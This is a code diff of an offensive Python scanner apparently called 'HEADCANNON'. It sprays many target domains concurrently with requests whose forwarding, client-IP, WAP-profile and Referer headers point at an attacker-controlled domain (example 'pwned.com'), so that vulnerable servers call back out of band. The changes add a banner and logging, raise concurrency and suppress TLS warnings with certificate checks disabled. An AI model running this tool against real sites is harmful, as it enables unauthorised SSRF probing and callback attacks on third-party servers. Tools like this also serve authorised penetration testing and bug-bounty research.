@@ -1,13 +1,28 @@
 #!/usr/bin/python3
 import sys
 import uuid
+import time
 import asyncio
 import argparse
 import requests
 from random import choice
+from colorama import Fore, Style, init
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
 from concurrent.futures import ThreadPoolExecutor
+
+
+banner = """
+    {}:{}:{} H E A D C A N N O N {}:{}:{}
+"""
+
+
+def timestamp(): return time.strftime('%x %X')
+def info(string): print('{}{}[+]{} {}{}{} - {}'.format(Style.BRIGHT, Fore.BLUE, Style.RESET_ALL, Style.DIM, timestamp(), Style.RESET_ALL, string))
+def warn(string): print('{}{}[!]{} {}{}{} - {}'.format(Style.BRIGHT, Fore.YELLOW, Style.RESET_ALL, Style.DIM, timestamp(), Style.RESET_ALL, string))
+def error(string): print('{}{}[!]{} {}{}{} - {}'.format(Style.BRIGHT, Fore.RED, Style.RESET_ALL, Style.DIM, timestamp(), Style.RESET_ALL, string))
+def stats(key, value): print('{:>16}{} : {}{}{}{}'.format(key, Style.DIM, Style.BRIGHT, Fore.CYAN, value, Style.RESET_ALL))
+
 
 user_agents =  ['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
@@ -28,11 +43,10 @@ def test_url(session, host, referer):
         protocol = 'http://'
 
     # build the headers with uuid for tracking
-    test_id = uuid.uuid4().hex
-    forwarded_for = test_id + '.forwardfor.' + referer
-    true_client_ip = test_id + '.trueclient.' + referer
-    wap_profile = protocol + test_id + '.wap.' + referer + '/wap.xml'
-    referer = protocol + test_id + '.referer.' + referer
+    forwarded_for = host + '.forwardfor.' + referer
+    true_client_ip = host + '.trueclient.' + referer
+    wap_profile = protocol + host + '.wap.' + referer + '/wap.xml'
+    referer = protocol + host + '.referer.' + referer
     user_agent = choice(user_agents)
 
     headers = {'X-Forwarded-For' : forwarded_for,
@@ -42,18 +56,25 @@ def test_url(session, host, referer):
                'User-Agent': user_agent,
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}
     
-    print('[+] Testing {}, {}'.format(host, test_id))
+    info('{}{}{}{} - {}'.format(Style.BRIGHT, Fore.BLUE, 'GET', Style.RESET_ALL, host))
 
     # send the request, check the status
-    response = session.get(protocol+host, 
-                           headers=headers, 
-                           timeout=args.timeout, 
-                           proxies=proxies,
-                           verify=False)
-    data = response.text
-    if response.status_code != 200:
-        print("[!] Error: {}, status {}".format(host, response.status_code))
-    return data
+    try:
+        response = session.get(protocol+host, 
+                               headers=headers, 
+                               timeout=args.timeout, 
+                               proxies=proxies,
+                               verify=False)
+
+        if response.status_code != 200:
+            if args.verbose:
+                warn('{}{}{}{} - {}'.format(Style.BRIGHT, Fore.YELLOW, response.status_code, Style.RESET_ALL, host))
+        return True
+
+    except Exception as e:
+        if args.verbose:
+            error('{}{}{}{} - {}'.format(Style.BRIGHT, Fore.RED, 'ERR', Style.RESET_ALL, host))
+        return False
 
 
 async def run_ansync():
@@ -61,9 +82,13 @@ async def run_ansync():
         with open(args.list, 'r') as f:
             target_list = [t.strip() for t in f.readlines()]
     else:
-        target_list = [args.target]
+        target_list = [args.domain]
 
-    print('[+] Loaded targets: {}'.format(len(target_list)))
+    # show the config
+    stats('workers', args.workers)
+    stats('targets', len(target_list))
+    
+    print('')
 
     with ThreadPoolExecutor(max_workers=args.workers) as executor:
         with requests.Session() as session:
@@ -73,7 +98,7 @@ async def run_ansync():
                 backoff_factor=0.3,
                 status_forcelist=(500, 502, 504),
             )
-            adapter = HTTPAdapter(max_retries=retry)
+            adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
             session.mount('http://', adapter)
             session.mount('https://', adapter)
 
@@ -82,6 +107,7 @@ async def run_ansync():
 
             # in case SSL fails
             session.verify = False
+            requests.packages.urllib3.disable_warnings()
 
             # run in executor loop
             loop = asyncio.get_event_loop()
@@ -98,6 +124,14 @@ async def run_ansync():
             
 
 def main():
+    # cross platform colorama
+    init()
+
+    # show the leet banner
+    print(banner.format(Fore.CYAN, Fore.MAGENTA, Style.RESET_ALL, Fore.MAGENTA, 
+           Fore.CYAN, Style.RESET_ALL))
+
+    # start the async loop
     loop = asyncio.get_event_loop()
     future = asyncio.ensure_future(run_ansync())
     loop.run_until_complete(future)
@@ -112,21 +146,16 @@ if __name__ == '__main__':
     parser.add_argument('-d', '--domain', metavar='', help='Domain to target')
     parser.add_argument('-l', '--list', metavar='', help='Specify list of domains to targets')
     parser.add_argument('-w', '--workers', type=int, metavar='', default=10, help='Max number of concurrent workers (default 10)')
-    parser.add_argument('-a', '--attacker', metavar='', help='url of referrer (ex: pwned.com)')
+    parser.add_argument('-a', '--attacker', required=True, metavar='', help='url of referrer (ex: pwned.com)')
     parser.add_argument('-s', '--ssl', action='store_true', default=False, help='use https instead of http')
     parser.add_argument('-t', '--timeout', type=int, metavar='', default=5, help='Specify request timeout (default 5 sec)')
     parser.add_argument('-r', '--retries', type=int, metavar='', default=5, help='Specify max retries (default 5)')
     parser.add_argument('-p', '--proxy', metavar='', help='Specify proxy (127.0.0.1:8080 or user:pass@127.0.0.1:8080)')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
     args = parser.parse_args()
 
     if args.proxy:
-        requests.packages.urllib3.disable_warnings()
-        if 'https' in args.proxy:
-            proxies = {'https': args.proxy}
-        elif 'http:' in args.proxy:
-            proxies = {'http': args.proxy}
-        else:
-            proxies = {'http': args.proxy, 'https': args.proxy}
+        proxies = {'http': args.proxy, 'https': args.proxy}
     else:
         proxies = None
 
